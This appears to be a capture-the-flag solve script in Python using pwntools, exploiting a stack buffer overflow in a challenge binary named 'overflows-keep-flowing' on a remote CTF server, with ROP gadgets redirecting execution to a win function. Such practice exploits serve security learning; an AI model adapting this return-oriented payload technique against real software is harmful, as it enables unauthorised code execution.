#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("overflows-keep-flowing")


local = False 
if local:
    p = process("./overflows-keep-flowing")
    gdb.attach(p,'''b*0x000000000040124a\nc''')
else:
    p = remote('overflows-keep-flowing-0.chals.kitctf.de', 1337, ssl=True)

elf = context.binary = ELF('./overflows-keep-flowing', checksec=False)

win = 0x00000000004011b6
rdi = 0x00000000004012b3
ret = 0x000000000040101a
payload = b'a'*(0x108) + p64(ret) + p64(rdi) + p64(0xDEADBEEFD3ADC0DE) + p64(win)
p.sendline(payload)
p.interactive()